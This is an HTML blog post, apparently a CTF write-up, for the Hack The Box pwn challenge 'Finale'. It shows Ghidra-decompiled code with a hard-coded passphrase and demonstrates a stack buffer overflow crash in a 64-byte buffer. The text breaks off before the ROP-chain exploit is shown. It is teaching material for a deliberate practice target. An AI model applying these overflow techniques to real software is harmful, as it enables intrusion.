<!doctype html><html lang="es"><head><title>Finale | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="64-bit binary. Buffer Overflow. open-read-write ROP chain"><meta itemprop="description" content="64-bit binary. Buffer Overflow. open-read-write ROP chain"><meta name="twitter:card" content="64-bit binary. Buffer Overflow. open-read-write ROP chain"><meta name="twitter:description" content="64-bit binary. Buffer Overflow. open-read-write ROP chain"><meta property="og:description" content="64-bit binary. Buffer Overflow. open-read-write ROP chain"><meta property="og:type" content="website"><meta name="robots" content="index, follow"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta itemprop="name" content="Finale"><meta property="twitter:title" content="Finale"><meta property="og:title" content="Finale"><meta property="og:url" content="https://7rocky.github.io/en/ctf/htb-challenges/pwn/finale/"><meta itemprop="keywords" content><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/ctf/htb-challenges/pwn/finale/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px"></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- PWN</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/htb-challenges/pwn/finale/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/htb-challenges/pwn/finale/&amp;text=Finale" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/ctf/htb-challenges/pwn/finale/&amp;title=Finale" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Finale</h1><p class="mb4 f6 dib tracked">12 minutes to read</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#environment-setup">Environment setup</a></li><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#buffer-overflow-vulnerability">Buffer Overflow vulnerability</a></li></ul></li><li><a href="#exploit-strategy">Exploit strategy</a><ul><li><a href="#finding-a-stable-rop-chain">Finding a stable ROP chain</a></li></ul></li><li><a href="#exploit-development">Exploit development</a></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are given a 64-bit binary called <code>finale</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little
RELRO:    <span class="code-dark-green">Full RELRO</span>
Stack:    <span class="code-dark-red">No canary found</span>
NX:       <span class="code-dark-green">NX enabled</span>
PIE:      <span class="code-dark-red">No PIE (0x400000)  
</code></pre></div><h2 id="environment-setup">Environment setup</h2><p>It might happen that we don&rsquo;t have a version of Glibc that is accepted by the program:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./finale</span>
./finale: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./finale)  
</code></pre></div><p>Luckily, in <a href="../spooky-time">Spooky Time</a> we were provided with a library and a loader, version 2.35:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">../pwn_spooky_time/glibc/ld-linux-x86-64.so.2</span> <span class="mtku">../pwn_spooky_time/glibc/libc.so.6</span>  
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 11.2.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
For bug reporting instructions, please see:
&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.
</code></pre></div><p>So, we can copy that directory in the current environment and use <a href="https://github.com/io12/pwninit"><code>pwninit</code></a> to patch the binary and use this new Glibc version:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">cp</span> -r <span class="mtku">../pwn_spooky_time/glibc</span> <span class="mtku">.</span>

<span class="code-cyan">$</span> <span class="code-dark-green">pwninit</span> --libc <span class="mtku">glibc/libc.so.6</span> --ld <span class="mtku">glibc/ld-linux-x86-64.so.2</span> --bin <span class="mtku">finale</span> --no-template  
<span class="code-dark-blue">bin</span>: <span class="code-blue">finale</span>
<span class="code-dark-yellow">libc</span>: <span class="code-yellow">glibc/libc.so.6</span>
<span class="code-dark-green">ld</span>: <span class="code-green">glibc/ld-linux-x86-64.so.2</span>

<span class="code-yellow">unstripping libc</span>
<span class="code-green">https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.35-0ubuntu3.1_amd64.deb</span>
<span class="code-magenta">warning: failed unstripping libc: libc deb error: failed to find file in data.tar</span>
<span class="code-dark-green">copying <span class="code-green">finale<span class="code-dark-green"> to <span class="code-green">finale_patched</span>
<span class="code-dark-green">running patchelf on <span class="code-green">finale_patched
</code></pre></div><p>Now we have another binary (<code>finale_patched</code>), and we are able to run it properly:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./finale_patched</span>


<span class="code-cyan">Let's celebrate Spooktober!!!</span>



<span class="code-cyan">                             ▝           ▝▘</span>
<span class="code-cyan">                     ▝▗▗      ▝</span>
<span class="code-cyan">                     ▞▚▘▝     ▝            ▗</span>
<span class="code-cyan">                       ▘  ▖      ▛▌        ▘</span>
<span class="code-cyan">              ▗           ▀            ▖        ▝</span>

<span class="code-cyan">                                  ▖</span>
<span class="code-cyan">              ▝             ▗▙  ▝           ▝▝</span>
<span class="code-cyan">               ▘            ▜           ▄▖</span>
<span class="code-cyan">                  ▝▛▙                           ▗▄</span>
<span class="code-cyan">                          ▗▖     ▘</span>
<span class="code-cyan">            ▖▖   ▘      ▗▗▚▚▚▘        ▖▖     ▖</span>
<span class="code-cyan">                         ▝▐▐▐              ▜▜▟▗</span>
<span class="code-cyan">            ▗▗      ▝▘    ▘       ▗▚       ▝▜▞</span>
<span class="code-cyan">             ▖▝  ▖                               ▞▖</span>
<span class="code-cyan">                        ▘   ▐▜▘</span>
<span class="code-cyan">            ▝▀▘   ▗▌            ▗         ▗▖</span>
<span class="code-cyan">                ▄         ▗            ▄      ▝▞▞▖</span>
<span class="code-cyan">          ▗▄▄    ▖   ▗ ▗    ▘</span>
<span class="code-cyan">         ▗▐▛▙█▄ ▖  ▖  ▗       ▘    ▝</span>
<span class="code-cyan">        ▗▜ ██▜▜▜▖▖ ▗       ▞▝        ▖           ▗</span>
<span class="code-cyan">       ▗▝▛▙▝▐███▙              ▝▝         ▖▘▖</span>
<span class="code-cyan">       ▛▖▀▟▄▖▘▛▌▀  ▀▘                           ▗</span>
<span class="code-cyan">     ▗▘▜▜▖▝▟▞▘                             ▘  ▞ ▘</span>
<span class="code-cyan">     ▛▙ ▜▞▀                                  ▝</span>
<span class="code-cyan">   ▗▌▐▀▀</span>
<span class="code-cyan">   ▞▀</span>




<span class="code-blue">[Strange man in mask screams some nonsense]: Us</span>

<span class="code-blue">[Strange man in mask]: In order to proceed, tell us the secret phrase:</span>  
</code></pre></div><h2 id="reverse-engineering">Reverse engineering</h2><p>If we open the binary in Ghidra, we will see this decompiled C source code for the <code>main</code> function:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> ret;</span>
<span class="mtk1">  undefined8 secret_phrase;</span>
<span class="mtk1">  undefined8 local_40;</span>
<span class="mtk1">  undefined4 local_38;</span>
<span class="mtk1">  undefined8 local_28;</span>
<span class="mtk1">  undefined8 local_20;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> fd;</span>
<span class="mtk1">  ulong i;</span>

<span class="mtk1">  </span><span class="mtk8">banner</span><span class="mtk1">();</span>
<span class="mtk1">  local_28 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  local_20 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  fd </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk4">"/dev/urandom"</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">read</span><span class="mtk1">(fd, </span><span class="mtk5">&amp;</span><span class="mtk1">local_28, </span><span class="mtk6">8</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">[Strange man in mask screams some nonsense]: </span><span class="mtk6">%s\n\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">local_28);</span>
<span class="mtk1">  </span><span class="mtk8">close</span><span class="mtk1">(fd);</span>

<span class="mtk1">  secret_phrase </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  local_40 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  local_38 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>

<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"[Strange man in mask]: In order to proceed, tell </span><span class="mtk4">us the secret phrase: "</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%16s</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">secret_phrase);</span>
<span class="mtk1">  i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>

<span class="mtk1">  </span><span class="mtk5">do</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">0x</span><span class="mtk6">e</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> i) {</span>
<span class="mtk1">LAB_00401588:</span>
<span class="mtk1">      ret </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strncmp</span><span class="mtk1">((</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk5">&amp;</span><span class="mtk1">secret_phrase, </span><span class="mtk4">"s34s0nf1n4l3b00"</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">f</span><span class="mtk1">);</span>

<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (ret </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk8">finale</span><span class="mtk1">();</span>
<span class="mtk1">      } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%s\n</span><span class="mtk4">[Strange man in mask]: Sorry, you are not allowed </span><span class="mtk4">to enter here!</span><span class="mtk6">\n\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00402020);</span>  
<span class="mtk1">      }</span>

<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) ((</span><span class="mtk7 mtki">long</span><span class="mtk1">) </span><span class="mtk5">&amp;</span><span class="mtk1">secret_phrase </span><span class="mtk5">+</span><span class="mtk1"> i) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk5">*</span><span class="mtk1">(undefined </span><span class="mtk5">*</span><span class="mtk1">) ((</span><span class="mtk7 mtki">long</span><span class="mtk1">) </span><span class="mtk5">&amp;</span><span class="mtk1">secret_phrase </span><span class="mtk5">+</span><span class="mtk1"> i) </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">      </span><span class="mtk5">goto</span><span class="mtk1"> LAB_00401588;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    i </span><span class="mtk5">=</span><span class="mtk1"> i </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
<span class="mtk1">  } </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
</code></pre></div><p>Here we are asked to enter a secret phrase, which is hard-coded in the function above (<code>s34s0nf1n4l3b00</code>). If we use it, we are prompted to enter more data, so let&rsquo;s test a Buffer Overflow vulnerability:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./finale_patched</span>


<span class="code-cyan">Let's celebrate Spooktober!!!</span>



<span class="code-cyan">                             ▝           ▝▘</span>
<span class="code-cyan">                     ▝▗▗      ▝</span>
<span class="code-cyan">                     ▞▚▘▝     ▝            ▗</span>
<span class="code-cyan">                       ▘  ▖      ▛▌        ▘</span>
<span class="code-cyan">              ▗           ▀            ▖        ▝</span>

<span class="code-cyan">                                  ▖</span>
<span class="code-cyan">              ▝             ▗▙  ▝           ▝▝</span>
<span class="code-cyan">               ▘            ▜           ▄▖</span>
<span class="code-cyan">                  ▝▛▙                           ▗▄</span>
<span class="code-cyan">                          ▗▖     ▘</span>
<span class="code-cyan">            ▖▖   ▘      ▗▗▚▚▚▘        ▖▖     ▖</span>
<span class="code-cyan">                         ▝▐▐▐              ▜▜▟▗</span>
<span class="code-cyan">            ▗▗      ▝▘    ▘       ▗▚       ▝▜▞</span>
<span class="code-cyan">             ▖▝  ▖                               ▞▖</span>
<span class="code-cyan">                        ▘   ▐▜▘</span>
<span class="code-cyan">            ▝▀▘   ▗▌            ▗         ▗▖</span>
<span class="code-cyan">                ▄         ▗            ▄      ▝▞▞▖</span>
<span class="code-cyan">          ▗▄▄    ▖   ▗ ▗    ▘</span>
<span class="code-cyan">         ▗▐▛▙█▄ ▖  ▖  ▗       ▘    ▝</span>
<span class="code-cyan">        ▗▜ ██▜▜▜▖▖ ▗       ▞▝        ▖           ▗</span>
<span class="code-cyan">       ▗▝▛▙▝▐███▙              ▝▝         ▖▘▖</span>
<span class="code-cyan">       ▛▖▀▟▄▖▘▛▌▀  ▀▘                           ▗</span>
<span class="code-cyan">     ▗▘▜▜▖▝▟▞▘                             ▘  ▞ ▘</span>
<span class="code-cyan">     ▛▙ ▜▞▀                                  ▝</span>
<span class="code-cyan">   ▗▌▐▀▀</span>
<span class="code-cyan">   ▞▀</span>




<span class="code-blue">[Strange man in mask screams some nonsense]: _</span>
                                              <span class="code-blue">'$</span>

<span class="code-blue">[Strange man in mask]: In order to proceed, tell us the secret phrase: s34s0nf1n4l3b00</span>

<span class="code-blue">[Strange man in mask]: Season finale is here! Take this souvenir with you for good luck: [0x7ffc798f0b40]</span>

<span class="code-blue">[Strange man in mask]: Now, tell us a wish for next year: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>  

<span class="code-blue">[Strange man in mask]: That's a nice wish! Let the Spooktober Spirit be with you!</span>

<span class="code-blue">zsh: segmentation fault (core dumped)  ./finale_patched</span>
</code></pre></div><h3 id="buffer-overflow-vulnerability">Buffer Overflow vulnerability</h3><p>The program crashed with a segmentation fault, so it is vulnerable to Buffer Overflow. This second stage of the program corresponds to a function called <code>finale</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">finale</span><span class="mtk1">() {</span>
<span class="mtk1">  undefined data[</span><span class="mtk6">64</span><span class="mtk1">];</span>
<span class="mtk1">  </span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">[Strange man in mask]: Season finale is here! Take</span><span class="mtk4"> this souvenir with you for good luck:  [</span><span class="mtk6">%p</span><span class="mtk4">]"</span><span class="mtk1">, data);</span>  
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n\n</span><span class="mtk4">[Strange man in mask]: Now, tell us a wish for nex</span><span class="mtk4">t year: "</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">fflush</span><span class="mtk1">(stdin);</span>
<span class="mtk1">  </span><span class="mtk8">fflush</span><span class="mtk1">(stdout);</span>
<span class="mtk1">  </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, data, </span><span class="mtk5">0x</span><span class="mtk6">1000</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">,</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">[Strange man in mask]: That</span><span class="mtk6">\'</span><span class="mtk4">s a nice wish! Let the Spooktober Spirit be with y</span><span class="mtk4">ou!</span><span class="mtk6">\n\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">54</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
</code></pre></div><p>The Buffer Overflow exists because <code>data</code> is a character array of 64 bytes, but the programs reads up to <code>0x1000</code> bytes. Therefore, we can write outside of the <code>data</code> array and modify existing values on the stack that are used by the program to control the execution flow. For instance, when the program calls <code>finale</code>, it stores the return address on the stack so that it can be popped when returning from <code>finale</code>.</p><p>In the previous example, we overwrote this saved return address with <code>0x41414141</code> (<code>AAAA</code> in hexadecimal format), which is not a valid address. That&rsquo;s why the program crashed.</p><p>As attackers, we are interested in controlling this value so that we can redirect program execution arbitrarily. We can use GDB to find the offset needed to reach this position in the stack.</p><p><strong>Note:</strong> For some reason, the following steps only work using <code>bash</code> as shell, not <code>zsh</code>.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span 